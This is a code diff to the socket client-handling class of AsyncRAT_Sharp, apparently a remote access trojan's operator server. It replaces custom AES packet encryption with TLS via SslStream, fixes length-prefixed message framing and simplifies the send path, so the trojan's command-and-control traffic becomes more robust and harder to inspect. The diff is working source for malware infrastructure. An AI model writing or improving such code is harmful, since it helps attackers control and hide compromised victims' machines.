@@ -9,12 +9,15 @@ using System.Diagnostics;
 using System.Threading;
 using AsyncRAT_Sharp.MessagePack;
 using System.Text;
+using System.Net.Security;
+using System.Security.Authentication;
 
 namespace AsyncRAT_Sharp.Sockets
 {
     public class Clients
     {
         public Socket ClientSocket { get; set; }
+        public SslStream ClientSslStream { get; set; }
         public ListViewItem LV { get; set; }
         public ListViewItem LV2 { get; set; }
         public string ID { get; set; }
@@ -23,15 +26,29 @@ namespace AsyncRAT_Sharp.Sockets
         private bool ClientBufferRecevied { get; set; }
         private MemoryStream ClientMS { get; set; }
         public object SendSync { get; } = new object();
-        private object EndSendSync { get; } = new object();
         public long BytesRecevied { get; set; }
 
         public Clients(Socket socket)
         {
             ClientSocket = socket;
-            ClientBuffer = new byte[4];
-            ClientMS = new MemoryStream();
-            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
+            ClientSslStream = new SslStream(new NetworkStream(ClientSocket, true), false);
+            ClientSslStream.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, EndAuthenticate, null);
+        }
+
+        private void EndAuthenticate(IAsyncResult ar)
+        {
+            try
+            {
+                ClientSslStream.EndAuthenticateAsServer(ar);
+                ClientBuffer = new byte[4];
+                ClientMS = new MemoryStream();
+                ClientSslStream.BeginRead(ClientBuffer, 0, ClientBuffer.Length, ReadClientData, null);
+            }
+            catch
+            {
+                ClientSslStream?.Dispose();
+                ClientSocket?.Dispose();
+            }
         }
 
         public async void ReadClientData(IAsyncResult ar)
@@ -45,30 +62,32 @@ namespace AsyncRAT_Sharp.Sockets
                 }
                 else
                 {
-                    int Recevied = ClientSocket.EndReceive(ar);
+                    int Recevied = ClientSslStream.EndRead(ar);
                     if (Recevied > 0)
                     {
+                        await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                         if (!ClientBufferRecevied)
                         {
-                            await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
-                            ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
-                            ClientMS.Dispose();
-                            ClientMS = new MemoryStream();
-                            if (ClientBuffersize > 0)
+                            if (ClientMS.Length == 4)
                             {
-                                ClientBuffer = new byte[ClientBuffersize];
-                                Debug.WriteLine("/// Server Buffersize " + ClientBuffersize.ToString() + " Bytes  ///");
-                                ClientBufferRecevied = true;
+                                ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
+                                ClientMS.Dispose();
+                                ClientMS = new MemoryStream();
+                                if (ClientBuffersize > 0)
+                                {
+                                    ClientBuffer = new byte[ClientBuffersize];
+                                    Debug.WriteLine("/// Server Buffersize " + ClientBuffersize.ToString() + " Bytes  ///");
+                                    ClientBufferRecevied = true;
+                                }
                             }
                         }
                         else
                         {
-                            await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                             Settings.Received += Recevied;
                             BytesRecevied += Recevied;
                             if (ClientMS.Length == ClientBuffersize)
                             {
-                                ThreadPool.QueueUserWorkItem(Packet.Read, new object[] {ClientMS.ToArray(), this });
+                                ThreadPool.QueueUserWorkItem(Packet.Read, new object[] { ClientMS.ToArray(), this });
                                 ClientBuffer = new byte[4];
                                 ClientMS.Dispose();
                                 ClientMS = new MemoryStream();
@@ -77,7 +96,7 @@ namespace AsyncRAT_Sharp.Sockets
                             else
                                 ClientBuffer = new byte[ClientBuffersize - ClientMS.Length];
                         }
-                        ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
+                        ClientSslStream.BeginRead(ClientBuffer, 0, ClientBuffer.Length, ReadClientData, null);
                     }
                     else
                     {
@@ -121,6 +140,7 @@ namespace AsyncRAT_Sharp.Sockets
 
             try
             {
+                ClientSslStream?.Dispose();
                 ClientSocket?.Dispose();
                 ClientMS?.Dispose();
             }
@@ -141,12 +161,15 @@ namespace AsyncRAT_Sharp.Sockets
 
                     if ((byte[])msg == null) return;
 
-                    byte[] buffer = Settings.AES.Encrypt((byte[])msg);
+                    byte[] buffer = (byte[])msg;
                     byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
                     ClientSocket.Poll(-1, SelectMode.SelectWrite);
-                    ClientSocket.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
-                    ClientSocket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
+                    ClientSslStream.Write(buffersize, 0, buffersize.Length);
+                    ClientSslStream.Write(buffer, 0, buffer.Length);
+                    ClientSslStream.Flush();
+                    Debug.WriteLine("/// Server Sent " + buffer.Length.ToString() + " Bytes  ///");
+                    Settings.Sent += buffer.Length;
                 }
                 catch
                 {
@@ -154,31 +177,6 @@ namespace AsyncRAT_Sharp.Sockets
                     return;
                 }
 
-            }
-        }
-
-        private void EndSend(IAsyncResult ar)
-        {
-            lock (EndSendSync)
-            {
-                try
-                {
-                    if (!ClientSocket.Connected)
-                    {
-                        Disconnected();
-                        return;
-                    }
-
-                    int sent = 0;
-                    sent = ClientSocket.EndSend(ar);
-                    Debug.WriteLine("/// Server Sent " + sent.ToString() + " Bytes  ///");
-                    Settings.Sent += sent;
-                }
-                catch
-                {
-                    Disconnected();
-                    return;
-                }
             }
         }
 
@@ -186,24 +184,23 @@ namespace AsyncRAT_Sharp.Sockets
         {
             lock (SendSync)
             {
-                lock (EndSendSync)
+
+                try
                 {
-                    try
-                    {
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Packet").AsString = "Ping";
-                        msgpack.ForcePathObject("Message").AsString = "This is a ping!";
-                        byte[] buffer = Settings.AES.Encrypt(msgpack.Encode2Bytes());
-                        byte[] buffersize = BitConverter.GetBytes(buffer.Length);
-                        ClientSocket.Poll(-1, SelectMode.SelectWrite);
-                        ClientSocket.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
-                        ClientSocket.Send(buffer, 0, buffer.Length, SocketFlags.None);
-                    }
-                    catch
-                    {
-                        Disconnected();
-                        return;
-                    }
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "Ping";
+                    msgpack.ForcePathObject("Message").AsString = "This is a ping!";
+                    byte[] buffer = msgpack.Encode2Bytes();
+                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
+                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
+                    ClientSslStream.Write(buffersize, 0, buffersize.Length);
+                    ClientSslStream.Write(buffer, 0, buffer.Length);
+                    ClientSslStream.Flush();
+                }
+                catch
+                {
+                    Disconnected();
+                    return;
                 }
             }
         }
